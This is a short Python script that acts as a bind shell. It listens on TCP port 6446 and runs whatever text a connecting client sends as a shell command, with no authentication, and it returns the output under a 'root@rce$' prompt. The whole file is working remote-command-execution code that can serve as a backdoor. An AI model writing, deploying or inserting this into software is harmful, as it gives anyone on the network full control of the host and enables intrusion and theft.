from socket import *
ip=gethostbyname(gethostname())
from subprocess import getoutput as gp
port=6446
adr=(ip,port)
s=socket(AF_INET,SOCK_STREAM)
s.bind(adr)
print(adr)
s.listen()
def handle(client):
  client.send(b'Connected')
  while True:
    cmd=client.recv(1024).decode()
    x=gp(cmd)+"\nroot@rce$ "
    client.send(bytes(x.encode('utf-8')))
while True:
  data,adr=s.accept()
  handle(data)
